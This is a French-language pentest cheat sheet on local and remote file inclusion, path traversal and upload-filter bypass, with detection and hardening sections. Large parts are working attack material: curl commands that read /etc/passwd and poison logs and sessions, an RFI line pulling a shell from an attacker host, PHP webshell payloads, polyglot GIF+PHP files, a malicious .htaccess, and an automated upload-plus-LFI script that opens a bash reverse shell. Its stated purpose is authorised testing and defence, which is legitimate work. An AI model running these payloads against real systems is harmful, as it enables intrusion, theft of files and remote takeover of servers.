---
title: "LFI/RFI — Inclusion de fichiers, traversée de répertoires et bypass d'upload"
description: "Analyse approfondie des vulnérabilités Local/Remote File Inclusion, Path Traversal et des techniques de contournement des filtres d'upload : listes noires d'extensions, bypass MIME, magic bytes et chaining Upload + LFI vers RCE."
tags:
  - web
  - lfi
  - rfi
  - path-traversal
  - php-wrappers
  - file-inclusion
  - file-upload
  - upload-bypass
  - rce
  - owasp
  - polyglot
  - mime-bypass
  - magic-bytes
---

# LFI/RFI — inclusion de fichiers et traversée de répertoires

Cheat sheet d'exploitation des vulnérabilités Local/Remote File Inclusion et Path Traversal.
Enrichie des techniques de bypass des filtres d'upload de fichiers et de leur chaining avec LFI/RFI.

!!! warning "Cadre légal"
    Ces techniques ne doivent être mises en œuvre que dans un cadre légal explicite : laboratoire, CTF, ou test d'intrusion couvert par une autorisation écrite.

---

## 1. Résumé exécutif & contexte

Les vulnérabilités de **File Inclusion** (LFI/RFI) et de **Path Traversal** constituent un vecteur
d'attaque fondamental dans les applications web à base de PHP et, plus généralement, dans tout
environnement permettant l'inclusion dynamique de ressources. Classées sous
**OWASP Top 10 Web (2021) A03:2021 — Injection**, elles permettent à un attaquant de lire des
fichiers arbitraires sur le serveur cible, voire d'y exécuter du code arbitraire.

| Vecteur | Impact maximal | Prérequis côté serveur |
|---|---|---|
| **Path Traversal** | Lecture de fichiers arbitraires hors racine web | Paramètre de chemin non filtré |
| **LFI** | RCE via log/session poisoning, wrappers PHP | `include()` / `require()` dynamique sur entrée utilisateur |
| **RFI** | RCE directe depuis un fichier distant contrôlé | `allow_url_include = On` |
| **File Upload + LFI** | RCE en deux étapes via fichier polyglotte | Fonctionnalité d'upload + point d'inclusion dynamique |

!!! danger "Vecteur émergent : l'upload de fichiers comme vecteur de préparation LFI/RFI"
    Un fichier uploadé sur un serveur — même renommé, même stocké dans un répertoire dédié — peut
    constituer un **contenu injectable** suffisant pour transformer une LFI anodine (simple lecture
    de fichier) en exécution de code arbitraire. Dès qu'une application cumule une fonctionnalité
    d'upload et un point d'inclusion dynamique, ces deux vecteurs doivent être évalués
    **conjointement**.

---

## 2. Mécanisme & fonctionnement interne

### Path Traversal & Local File Inclusion (LFI)

#### Traversée de répertoires basique et avancée

```bash
../../../../etc/passwd                  # Traversée classique sous Linux (chemin relatif)
..\..\..\boot.ini                       # Équivalent Windows, séparateur backslash
....//....//....//etc/passwd            # Contourne un filtre remplaçant "../" une seule fois
/etc/passwd%00                          # Null byte bypass (PHP < 5.3.4 uniquement)
```

!!! tip "Nombre de remontées"
    Multipliez les séquences `../` sans crainte d'excès : dépasser la racine du système de fichiers ne provoque généralement aucune erreur, le chemin reste simplement bloqué à `/`.

#### Fichiers cibles sensibles

| Système | Chemin | Intérêt |
|---|---|---|
| Linux | `/etc/passwd` | Liste des comptes utilisateurs du système |
| Linux | `/etc/issue` | Bannière d'identification de la distribution |
| Linux | `/proc/self/environ` | Variables d'environnement du processus web |
| Linux | `/var/log/auth.log` | Journal d'authentification (Debian/Ubuntu) |
| Windows | `C:\Windows\win.ini` | Fichier de configuration système standard |
| Windows | `C:\inetpub\wwwroot\web.config` | Configuration IIS, potentiellement des secrets |

```bash
curl "http://cible.com/page.php?file=../../../../etc/passwd"    # Test direct via curl
curl "http://cible.com/page.php?file=..\..\..\..\windows\win.ini"  # Variante Windows
```

---

### Wrappers PHP pour la lecture et l'exécution

#### Exfiltration de code source (Base64)

```bash
php://filter/read=convert.base64-encode/resource=index.php
# Encode le fichier cible en Base64 avant affichage, contournant l'exécution PHP native
```

!!! tip "Pourquoi Base64 et pas le fichier brut ?"
    Inclure directement un fichier `.php` l'exécute au lieu de l'afficher. Le wrapper `php://filter` avec encodage Base64 permet de lire le code source sans déclencher son interprétation par le moteur PHP.

#### Exécution de code à la volée

```bash
php://input
# Exécute le corps de la requête HTTP POST comme code PHP, si include($_GET['file']) est vulnérable

data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
# Injecte directement du PHP encodé en Base64 via le wrapper data://
```

```bash
curl -X POST "http://cible.com/page.php?file=php://input" \
  --data '<?php system($_GET["cmd"]); ?>'
# Combine php://input avec un payload PHP dans le corps de la requête POST
```

!!! warning "Prérequis serveur"
    Le wrapper `php://input` nécessite `allow_url_include = On` mais n'est pas soumis à `allow_url_fopen`.

---

### Escalade d'une LFI vers une RCE

#### Log Poisoning

Injecte du code PHP dans un journal serveur via un champ contrôlé (User-Agent, referer, identifiants), puis inclut ce journal via la LFI.

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://cible.com/"
# Injecte le payload PHP dans le User-Agent, journalisé par le serveur web
```

```bash
curl "http://cible.com/page.php?file=../../../var/log/apache2/access.log&cmd=id"
# Inclut le journal Apache empoisonné, exécutant le payload injecté
curl "http://cible.com/page.php?file=../../../var/log/nginx/access.log&cmd=id"
# Variante pour un serveur Nginx
curl "http://cible.com/page.php?file=../../../var/log/sshd.log&cmd=id"
# Empoisonnement via un nom d'utilisateur SSH contenant du code PHP (tentative de connexion)
```

!!! tip "Droits de lecture requis"
    Le compte exécutant le serveur web doit disposer des droits de lecture sur les journaux ciblés, ce qui n'est pas garanti selon le durcissement du système (logs souvent réservés à `root` ou `adm`).

#### PHP Session Poisoning

```bash
curl -b "PHPSESSID=abc123" "http://cible.com/" \
  --data "user=<?php system(\$_GET['cmd']); ?>"
# Injecte le payload dans une donnée de session persistée côté serveur
```

```bash
curl "http://cible.com/page.php?file=/tmp/sess_abc123&cmd=id"
# Inclut le fichier de session empoisonné pour exécuter le payload
```

#### `/proc/self/environ` & `/proc/self/cmdline`

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://cible.com/"
# Injecte le payload dans le User-Agent, repris dans les variables d'environnement
curl "http://cible.com/page.php?file=/proc/self/environ&cmd=id"
# Inclut les variables d'environnement du processus PHP, exécutant le payload injecté
```

!!! warning "Éphémère et peu fiable"
    `/proc/self/environ` correspond au processus courant : la technique fonctionne surtout sous les anciens modèles CGI, rarement sous PHP-FPM ou mod_php modernes où le processus diffère entre les requêtes.

---

### Remote File Inclusion (RFI)

Permet d'inclure et d'exécuter un fichier hébergé sur un serveur distant contrôlé par l'attaquant.

```bash
http://cible.com/page.php?file=http://attaquant.com/shell.txt
# Inclut et exécute un shell PHP hébergé à distance
http://cible.com/page.php?file=http://attaquant.com/shell.txt?
# Le "?" final neutralise une extension .php ajoutée par l'application vulnérable
```

```php
// Contenu type de shell.txt (extension volontairement non .php pour éviter le blocage)
<?php system($_GET['cmd']); ?>
```

!!! warning "Directives PHP requises"
    Une RFI n'est exploitable que si `allow_url_include = On` dans `php.ini`, une configuration désactivée par défaut depuis PHP 5.2 en raison de son risque critique. `allow_url_fopen = On` est également nécessaire.

---

### Traitement serveur d'un fichier uploadé — mécanisme interne

Comprendre le cycle de vie d'un fichier uploadé est essentiel pour anticiper les points de
contrôle et les surfaces de contournement.

```text
Cycle de vie d'un fichier uploadé côté serveur :

1. Le client envoie une requête multipart/form-data contenant le fichier dans le corps
2. Le serveur web (Apache/Nginx) reçoit le flux et le stocke dans un répertoire temporaire
   → PHP : /tmp/phpXXXXXX (nom généré aléatoirement, supprimé en fin de script si non déplacé)
3. La logique applicative peut valider (ou non) :
   a. L'extension du nom de fichier fourni par le client  ← entièrement contrôlable par l'attaquant
   b. Le Content-Type déclaré dans le header multipart    ← entièrement contrôlable par l'attaquant
   c. La signature magique (Magic Bytes) du contenu réel  ← partiellement bypassable via polyglotte
   d. La taille du fichier
4. Si validation réussie : move_uploaded_file() déplace le fichier vers sa destination finale
5. L'URL finale est souvent retournée dans la réponse ou déductible du comportement de l'appli
6. Une LFI peut inclure ce fichier et, si include() est utilisé, exécuter tout code PHP qu'il contient
```

!!! danger "Point critique : seule la validation du contenu binaire réel protège"
    Les champs `Content-Type` et le nom de fichier fournis dans la requête multipart sont
    **entièrement sous le contrôle du client** et ne garantissent rien sur la nature réelle du
    contenu. Seule une validation portant sur le **contenu binaire effectif** du fichier (Magic
    Bytes lus côté serveur, re-compression via GD/Imagick) offre une protection réelle — et même
    celle-ci peut être contournée par des fichiers polyglottes si elle n'est pas combinée à du
    renommage et à une désactivation de l'exécution dans le répertoire de destination.

---

## 3. Empreinte & Détection

### Identification des points d'inclusion vulnérables

L'identification d'une LFI repose sur la détection de tout paramètre dont la valeur influence une
opération d'inclusion ou de lecture de fichier côté serveur.

```bash
# Paramètres typiquement vulnérables à surveiller
?file=page.php
?page=home
?include=header
?template=default
?path=../config
?doc=manual.pdf
```

```bash
# Sondes LFI minimales universelles
curl "http://cible.com/index.php?file=../../../../etc/passwd"
curl "http://cible.com/index.php?page=php://filter/read=convert.base64-encode/resource=index.php"
# Une réponse contenant "root:" ou une longue chaîne Base64 confirme la vulnérabilité
```

### Analyse des requêtes d'upload (en-têtes multipart)

Lors du test d'une fonctionnalité d'upload, inspecter systématiquement via Burp Suite ou un proxy
équivalent :

```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="file"; filename="image.jpg"
Content-Type: image/jpeg

[contenu binaire du fichier]
------WebKitFormBoundary7MA4YWxk--
```

Points à documenter lors du mapping de la fonctionnalité d'upload :

- **URL de destination** du fichier après upload (retournée en JSON, ou déductible du comportement)
- **Conservation ou transformation** du nom fourni (renommage aléatoire côté serveur, ou conservation du nom original ?)
- **Répertoire de stockage** : accessible directement par URL ? Protégé par `.htaccess` ? Hors racine web ?
- **Réponse d'erreur** en cas d'extension non autorisée : révèle souvent la logique de validation (liste noire ou liste blanche)
- **Chemin retourné** dans la réponse : constitue le premier maillon du chaining avec une LFI

### Indicateurs de détection (perspective Blue Team)

```bash
# Patterns LFI dans les journaux Apache/Nginx
grep -E "\.\./|%2e%2e|%252e%252e|php://|data://|/etc/passwd|/proc/self" \
    /var/log/apache2/access.log

# Recherche de fichiers PHP uploadés dans le répertoire d'uploads (indicateur de webshell)
find /var/www/html/uploads/ \
    \( -name "*.php" -o -name "*.phtml" -o -name "*.phar" -o -name "*.php5" \) \
    2>/dev/null

# Fichiers PHP créés récemment dans la racine web (détection de shells fraîchement uploadés)
find /var/www/html/ -newer /var/www/html/index.php -name "*.php" 2>/dev/null
```

!!! tip "Règle YARA minimale pour la détection de webshells PHP uploadés"
    ```
    rule Webshell_PHP_Simple {
        meta:
            description = "Détecte les webshells PHP à interaction via paramètres HTTP"
        strings:
            $php_open   = "<?php"        ascii
            $sys1       = "system("      ascii
            $sys2       = "exec("        ascii
            $sys3       = "passthru("    ascii
            $sys4       = "shell_exec("  ascii
            $param_get  = "$_GET"        ascii
            $param_post = "$_POST"       ascii
        condition:
            $php_open and
            (1 of ($sys*)) and
            (1 of ($param_*))
    }
    ```
    Cette règle détecte les webshells PHP à interaction par paramètre HTTP, quel que soit leur nom
    de fichier ou leur extension stockée sur disque — y compris les polyglottes `.jpg` ou `.gif`
    inclus via LFI.

---

## 4. Méthodologie d'exploitation & variantes

### Contournement de filtres & remédiation

#### Techniques de bypass

| Technique | Exemple | Principe |
|---|---|---|
| Double encoding | `%252e%252e%252f` | `%25` se décode en `%`, révélant `%2e%2e%2f` après un second passage |
| Null byte | `../../etc/passwd%00` | Tronque la chaîne après le null byte (PHP < 5.3.4 uniquement) |
| Overlong UTF-8 | `%c0%ae%c0%ae%c0%af` | Encodage UTF-8 non canonique de `../`, parfois accepté par un décodeur laxiste |
| Suffixe absorbé | `....//....//etc/passwd` | Contourne un remplacement naïf et non récursif de `../` |

```bash
curl "http://cible.com/page.php?file=..%252f..%252f..%252fetc%252fpasswd"
# Double encodage de "../" pour contourner un WAF décodant une seule fois
```

!!! tip "Tester plusieurs variantes systématiquement"
    Un filtre peut bloquer `../` en clair tout en laissant passer sa version encodée, doublement encodée, ou mêlée à des séquences absorbées. Automatiser ces variantes via `ffuf` ou `wfuzz` accélère considérablement la détection.

---

### Variante : Bypass des contrôles d'upload (LFI/RFI via File Upload)

#### 4.1 Validation côté client vs validation côté serveur

!!! danger "La validation côté client ne constitue pas une protection"
    Toute restriction imposée via JavaScript (`accept=".jpg,.png"` en HTML5, vérification
    d'extension en JS avant soumission) est **entièrement contournable** par simple interception
    de la requête HTTP avec un proxy (Burp Suite, mitmproxy) et modification du nom de fichier
    et du `Content-Type` **après** que le navigateur a validé le fichier légitime. Le serveur
    ne voit jamais la validation côté client — il ne reçoit que la requête HTTP forgée.

```text
Scénario de contournement côté client en 4 étapes :

1. L'attaquant sélectionne une image légitime (image.jpg)
   → La validation HTML accept=".jpg" / JavaScript accepte le fichier
2. La requête HTTP multipart est interceptée dans Burp Suite avant transmission au serveur
3. Le champ filename est modifié : "image.jpg" → "shell.php"
   Le corps de la partie file est remplacé par le payload PHP cible
4. La requête modifiée est transmise au serveur
   → Le serveur reçoit shell.php sans jamais que la validation côté client ait pu intervenir
```

| Mécanisme de validation | Contrôlable par l'attaquant ? | Niveau de protection réel |
|---|---|---|
| Attribut HTML `accept` | Oui — ignoré si la requête est forgée directement | **Aucun** |
| Vérification JavaScript de l'extension | Oui — contournable par proxy | **Aucun** |
| `Content-Type` dans la partie multipart | Oui — modifiable librement dans la requête | **Aucun** |
| Liste noire d'extensions côté serveur | Partiellement — extensions alternatives non listées | **Faible** |
| Liste blanche d'extensions côté serveur | Non (si exhaustive et stricte) | **Bon** |
| Magic Bytes lus côté serveur (`finfo`) | Partiellement — bypassable par fichier polyglotte | **Moyen** |
| Re-compression via GD/Imagick | Non — détruit tout payload inséré | **Fort** |
| Renommage aléatoire + stockage hors racine web | Non pertinent pour l'attaquant | **Fort** |

#### 4.2 Faiblesses des listes noires d'extensions

La validation par **liste noire** consiste à refuser les extensions jugées dangereuses (`.php`,
`.php5`, `.phtml`…). Cette approche est structurellement défaillante : elle suppose d'énumérer
exhaustivement toutes les extensions interprétées par le serveur cible — ce qui est impossible
en pratique, surtout sur des configurations Apache personnalisées ou des serveurs multi-langages.

**Extensions PHP alternatives potentiellement interprétées selon la configuration serveur :**

```bash
shell.php3        # Héritage PHP 3 — encore reconnu par certaines configs Apache
shell.php4        # Héritage PHP 4 — encore reconnu par certaines configs Apache
shell.php5        # Interprété nativement par le runtime PHP 5
shell.php7        # Interprété nativement par le runtime PHP 7
shell.phtml       # PHP HTML : interprété par défaut sur de nombreuses configs Apache
shell.phar        # PHP Archive : exécutable directement par le runtime PHP
shell.php.png     # Double extension : si le serveur traite la première extension rencontrée
shell.PHP         # Variation de casse (systèmes insensibles à la casse : Windows, macOS)
shell.PhP         # Mélange de casse — contourne un filtre sensible à la casse
shell.php%00.jpg  # Null byte (PHP < 5.3.4) : tronque l'extension au niveau du %00
shell.php;.jpg    # Injection de point-virgule — certains serveurs Nginx mal configurés
```

```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------Boundary--
```

!!! warning "Vecteur secondaire : upload d'un `.htaccess` malveillant"
    Sur les configurations Apache autorisant l'upload et l'interprétation de fichiers `.htaccess`,
    uploader un `.htaccess` contenant une directive `AddType` peut forcer l'interprétation de
    fichiers au contenu PHP derrière une extension d'image — sans toucher au code applicatif :
    ```apache
    # Contenu d'un .htaccess malveillant uploadé dans le répertoire d'uploads
    AddType application/x-httpd-php .jpg
    # Après cet upload, tout fichier .jpg dans ce répertoire est exécuté comme du PHP
    ```

**Comparaison structurelle liste noire vs liste blanche :**

```text
Liste noire (approche défaillante) :       Liste blanche (approche robuste) :
─────────────────────────────────────      ─────────────────────────────────────
Refuse explicitement :                     Accepte UNIQUEMENT :
  .php, .php5, .phtml, .phar ...             .jpg, .jpeg, .png, .gif, .webp
Autorise implicitement :                   Refuse implicitement :
  → tout ce qui n'est pas dans la liste      → tout ce qui ne correspond pas exactement
  → extensions non anticipées                → aucune extension non listée ne passe
  → variantes de casse, double extension     → robuste aux nouvelles extensions futures
```

#### 4.3 Bypass de la vérification du `Content-Type` MIME

Le champ `Content-Type` de la partie multipart est **entièrement fourni par le client** et n'a
aucune valeur probante sur la nature réelle du contenu transmis. Il peut être altéré librement
depuis un proxy d'interception, indépendamment du contenu réel du fichier.

```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg        ← MIME déclaré : image légitime (falsifié par l'attaquant)

<?php system($_GET['cmd']); ?>  ← Contenu réel : code PHP exécutable
------Boundary--
```

```python
# Forger la requête d'upload avec un Content-Type falsifié via requests (Python)
import requests

url = "http://cible.com/upload"
files = {
    "file": (
        "shell.php",                            # Nom de fichier avec extension PHP
        b"<?php system($_GET['cmd']); ?>",      # Contenu PHP réel du fichier
        "image/jpeg",                           # Content-Type déclaré : falsifié en image/jpeg
    )
}
r = requests.post(url, files=files)
print(r.status_code, r.text)
# Si la réponse contient le chemin du fichier uploadé, le chaining avec LFI peut commencer
```

#### 4.4 Bypass de la vérification des Magic Bytes (fichiers polyglottes)

Certaines implémentations vont au-delà du `Content-Type` déclaré et lisent les premiers octets
du fichier pour vérifier sa signature réelle. Cette protection peut être contournée via un
**fichier polyglotte** : un fichier dont les premiers octets satisfont la signature d'image
attendue, mais dont le reste du contenu contient un payload PHP valide et exécutable via une
inclusion.

**Signatures magiques courantes exploitées dans ce contexte :**

| Format | Magic Bytes (hex) | Représentation ASCII | Vérifié par |
|---|---|---|---|
| JPEG | `FF D8 FF` | `ÿØÿ` | `getimagesize()`, `finfo` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG....` | `getimagesize()`, `finfo` |
| GIF87a | `47 49 46 38 37 61` | `GIF87a` | `getimagesize()`, `finfo` |
| GIF89a | `47 49 46 38 39 61` | `GIF89a` | `getimagesize()`, `finfo` |
| PDF | `25 50 44 46` | `%PDF` | `finfo` uniquement |

```bash
# Création d'un fichier polyglotte GIF89a + PHP
# Les 7 premiers octets satisfont la signature GIF89a reconnue par getimagesize()
# Le reste est du code PHP valide, exécuté si le fichier est inclus via include()
printf 'GIF89a;' > shell.gif.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.gif.php

# Vérification : getimagesize() retourne ["mime" => "image/gif"] pour ce fichier
# Le code PHP qu'il contient reste néanmoins exécutable via une LFI
```

```php
<?php
// Implémentation vulnérable — getimagesize() seul ne suffit pas à exclure les polyglottes
$imgInfo = getimagesize($_FILES['file']['tmp_name']);

if ($imgInfo === false) {
    // Le polyglotte GIF89a;<?php...?> passe ce test car il est parsable comme une image GIF
    die(json_encode(['error' => 'Fichier invalide']));
}

// ← À ce stade, le polyglotte a passé la vérification
// Son contenu PHP reste exécutable si le fichier est inclus via une LFI ultérieure
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
?>
```

!!! note "Limite de `getimagesize()` et `finfo` comme protections exclusives"
    `getimagesize()` vérifie que le fichier peut être *parsé* comme une image et retourne ses
    dimensions, mais **ne garantit pas l'absence de code PHP dans les octets suivants la
    signature**. Un polyglotte valide à la fois comme GIF et comme source PHP passe cette
    vérification sans difficulté. La seule contre-mesure robuste à ce stade est la
    **re-compression de l'image** via GD ou Imagick, qui reconstruit le fichier pixel par pixel
    et détruit tout payload inséré dans les données non-image.

#### 4.5 Chaining : Upload de fichier malveillant + LFI → RCE

Ce scénario combine deux vulnérabilités distinctes en une chaîne d'exploitation aboutissant à
une exécution de code arbitraire complète.

```text
Flux complet du chaining Upload + LFI → RCE :

┌─ Étape 1 — Upload du payload polyglotte ─────────────────────────────────────────────┐
│  POST /upload                                                                         │
│  Body : fichier shell.jpg contenant GIF89a;<?php system($_GET['cmd']); ?>             │
│  Réponse : {"url": "/uploads/user_1234/shell.jpg", "status": "ok"}                   │
│  → Le fichier est stocké à /var/www/html/uploads/user_1234/shell.jpg                 │
└───────────────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─ Étape 2 — Exploitation de la LFI avec le fichier uploadé comme source ──────────────┐
│  GET /page.php?file=../../../../var/www/html/uploads/user_1234/shell.jpg&cmd=id       │
│  → include() charge le fichier "image"                                                │
│  → PHP ignore la signature GIF en début de fichier et exécute le code PHP injecté    │
│  Réponse : GIF89a;uid=33(www-data) gid=33(www-data) groups=33(www-data)              │
└───────────────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─ Étape 3 — Escalade vers un reverse shell interactif ────────────────────────────────┐
│  GET /page.php?file=../../../../.../shell.jpg                                         │
│      &cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261'                       │
│  → Reverse shell vers le listener de l'attaquant (nc -lvnp 4444)                     │
└───────────────────────────────────────────────────────────────────────────────────────┘
```

```bash
# Script de chaining automatisé — preuve de concept

# 1. Créer le payload polyglotte (signature GIF + code PHP)
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > payload.jpg

# 2. Uploader le payload avec un Content-Type image/gif pour passer les filtres MIME
echo "[*] Upload du payload polyglotte..."
UPLOAD_RESP=$(curl -s -X POST "http://cible.com/upload" \
  -F "file=@payload.jpg;type=image/gif" \
  -F "submit=1")
echo "[*] Réponse upload : $UPLOAD_RESP"

# 3. Construire le vecteur LFI (adapter le chemin selon la config de l'appli cible)
LFI_PATH="../../../../var/www/html/uploads/payload.jpg"

# 4. Vérifier l'exécution de code via la LFI
echo "[*] Test d'exécution de code via LFI..."
curl -s "http://cible.com/page.php?file=${LFI_PATH}&cmd=id"

# 5. Escalade : reverse shell (adapter l'IP et le port)
LHOST="10.0.0.1"
LPORT="4444"
CMD="bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
curl -s -G "http://cible.com/page.php" \
  --data-urlencode "file=${LFI_PATH}" \
  --data-urlencode "cmd=${CMD}"
```

!!! danger "Conditions nécessaires à la réussite du chaining"
    | Condition | Impact si non remplie |
    |---|---|
    | Le fichier uploadé est lisible par le processus PHP | `include()` échoue silencieusement |
    | Le chemin du fichier uploadé est connu ou devinable | Impossible de construire le vecteur LFI |
    | La LFI ne restreint pas les répertoires accessibles | Si seul `/pages/` est inclus, l'upload dans `/uploads/` ne suffit pas |
    | L'extension finale stockée n'empêche pas l'exécution PHP | Un renommage en `.dat` ne bloque **pas** l'exécution via `include()` |
    | Le répertoire d'upload n'a pas d'exécution PHP désactivée | Un `.htaccess` avec `php_flag engine off` casse le chaining |

---

## 5. Remédiation & Hardening

### Bonnes pratiques de développement (Path Traversal & LFI)

| Mesure | Principe |
|---|---|
| **Whitelisting** | N'accepter qu'un ensemble fini et prédéfini de noms de fichiers, jamais un chemin arbitraire |
| **Désactivation des wrappers dangereux** | Restreindre `allow_url_include`, `allow_url_fopen` au strict nécessaire |
| **Normalisation stricte du chemin** | Résoudre le chemin réel (`realpath()`) et vérifier qu'il reste dans le répertoire autorisé |
| **Moindre privilège** | Le compte exécutant l'application ne doit pas avoir accès en lecture aux journaux système ni aux fichiers sensibles |

```php
// Vulnérable : chemin utilisateur directement inclus
include($_GET['file']);

// Sécurisé : whitelist stricte des pages autorisées
$pages = ['accueil', 'contact', 'apropos'];
if (in_array($_GET['page'], $pages)) {
    include($_GET['page'] . '.php');
}
```

### Sécurisation des fonctionnalités d'upload de fichiers

!!! danger "Principe fondamental : défense en profondeur cumulative"
    Les mesures ci-dessous doivent être appliquées **toutes ensemble** — une seule mesure isolée
    peut être contournée. Leur combinaison constitue une défense en profondeur efficace contre
    l'ensemble des variantes de bypass décrites en section 4.

**1. Validation par liste blanche d'extensions — côté serveur uniquement :**

```php
<?php
// Liste blanche stricte : seules ces extensions sont acceptées
$ALLOWED_EXTENSIONS = ['jpg', 'jpeg', 'png', 'gif', 'webp'];

$uploadedName = $_FILES['file']['name'];
// pathinfo() extrait l'extension après le dernier point — résistant à "shell.php.jpg"
$ext = strtolower(pathinfo($uploadedName, PATHINFO_EXTENSION));

if (!in_array($ext, $ALLOWED_EXTENSIONS)) {
    http_response_code(400);
    die(json_encode(['error' => 'Type de fichier non autorisé']));
}
// Ne jamais dériver l'extension via substr(strrchr(...)) ou split('.') naïf :
// ces méthodes peuvent retourner "php" si "shell.php.jpg" est soumis avec un split sur
// le premier point plutôt que le dernier.
?>
```

**2. Vérification du type MIME réel via lecture des Magic Bytes (indépendant du `Content-Type` HTTP) :**

```php
<?php
// finfo lit les octets réels du fichier temporaire — jamais le Content-Type déclaré par le client
$finfo = new finfo(FILEINFO_MIME_TYPE);
$realMime = $finfo->file($_FILES['file']['tmp_name']);

$ALLOWED_MIMES = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];

if (!in_array($realMime, $ALLOWED_MIMES)) {
    http_response_code(400);
    die(json_encode(['error' => 'Contenu de fichier non reconnu']));
}
// Note : cette vérification seule reste bypassable par un fichier polyglotte (section 4.4).
// Elle doit OBLIGATOIREMENT être combinée avec la re-compression ci-dessous.
?>
```

**3. Re-compression de l'image — contre-mesure robuste contre les fichiers polyglottes :**

```php
<?php
// Re-créer l'image pixel par pixel via GD détruit tout payload inséré après la signature
// C'est la SEULE méthode efficace contre les fichiers polyglottes GIF/JPEG/PNG + PHP
$tmpPath = $_FILES['file']['tmp_name'];

// Créer une ressource image depuis le fichier uploadé (échoue si le fichier n'est pas une image valide)
$source = imagecreatefromstring(file_get_contents($tmpPath));
if ($source === false) {
    http_response_code(400);
    die(json_encode(['error' => 'Fichier image invalide ou corrompu']));
}

// Re-compression JPEG → reconstruit le fichier à partir des données pixel, détruit tout payload
$destPath = '/var/storage/uploads/' . bin2hex(random_bytes(16)) . '.jpg';
imagejpeg($source, $destPath, 85);
imagedestroy($source);
// Le fichier stocké en /var/storage/ est maintenant un JPEG pur, sans aucun code PHP
?>
```

**4. Renommage aléatoire et stockage hors de la racine web :**

```php
<?php
// Le nom original fourni par le client est COMPLETEMENT ignoré pour le nom de stockage.
// L'extension est dérivée exclusivement du type MIME réel validé par finfo.
$safeExtMap = [
    'image/jpeg' => 'jpg',
    'image/png'  => 'png',
    'image/gif'  => 'gif',
    'image/webp' => 'webp',
];

$ext        = $safeExtMap[$realMime] ?? 'bin';
$storedName = bin2hex(random_bytes(16)) . '.' . $ext; // Nom totalement imprévisible

// Stockage HORS de la racine web : /var/storage/ n'est pas accessible par URL directe
// → même si un attaquant connaissait le nom, il ne pourrait pas l'atteindre sans LFI
$destPath = '/var/storage/uploads/' . $storedName;
move_uploaded_file($_FILES['file']['tmp_name'], $destPath);
?>
```

**5. Désactivation de l'exécution dans le répertoire de destination (si stockage sous la racine web) :**

```apache
# .htaccess dans /var/www/html/uploads/ — désactive l'exécution PHP, CGI et SSI
php_flag engine off
Options -ExecCGI
# Force le traitement de toutes les extensions connues comme du texte brut inerte
AddType text/plain .php .php3 .php4 .php5 .php7 .phtml .phar .shtml .cgi
```

```nginx
# Nginx : bloquer PHP-FPM pour le répertoire d'uploads
location /uploads/ {
    # Servir uniquement comme fichiers statiques — aucun bloc fastcgi_pass ici
    add_header X-Content-Type-Options nosniff always;
    add_header Content-Disposition "attachment" always; # Force le téléchargement
    try_files $uri =404;
    # L'absence de fastcgi_pass empêche PHP-FPM de traiter les fichiers de ce répertoire
}
```

!!! tip "Checklist de sécurisation complète des uploads"
    - [ ] Validation par **liste blanche** d'extensions autorisées côté serveur (jamais par liste noire, jamais côté client seul)
    - [ ] Vérification du type MIME réel via `finfo` (Magic Bytes — jamais via le `Content-Type` HTTP)
    - [ ] **Re-compression de l'image** via GD/Imagick pour neutraliser tout fichier polyglotte
    - [ ] **Renommage aléatoire** du fichier à la destination (nom original fourni par le client jamais conservé)
    - [ ] Stockage **hors de la racine web** (répertoire non accessible par URL directe)
    - [ ] Si stockage sous la racine web : désactivation explicite de l'exécution PHP/CGI (`.htaccess` ou config Nginx dédiée)
    - [ ] Vérification que le chemin de destination final reste dans le répertoire autorisé (`realpath()` + comparaison de préfixe)
    - [ ] Limitation de la taille maximale des fichiers acceptés (`upload_max_filesize`, `post_max_size`)
    - [ ] Ne pas exposer le chemin de stockage réel dans les réponses HTTP (prévient le chaining avec une LFI)

---

## 6. Références & Cheat Sheets

### Voir aussi

- OWASP Testing Guide — chapitre Path Traversal / File Inclusion
- Fiche complémentaire : `sqli.md` pour les injections côté base de données

### Ressources complémentaires (File Upload & LFI/RFI)

| Ressource | Contenu |
|---|---|
| [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) | Payloads LFI/RFI, wrappers PHP, techniques d'escalade vers RCE |
| [PayloadsAllTheThings — File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files) | Payloads d'upload, fichiers polyglottes, extensions alternatives par serveur |
| [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) | Définition officielle, impacts, contre-mesures OWASP |
| [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload) | Techniques de bypass avancées, cas particuliers par configuration serveur |
| [PortSwigger Web Academy — File Upload](https://portswigger.net/web-security/file-upload) | Labs interactifs, théorie détaillée, variantes avancées (Burp Suite) |
| [HackTricks — LFI to RCE](https://book.hacktricks.xyz/pentesting-web/file-inclusion) | Compilation des techniques d'escalade LFI → RCE (logs, sessions, wrappers) |
| [Wikipedia — File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | Référence complète des signatures magiques (Magic Bytes) par format de fichier |
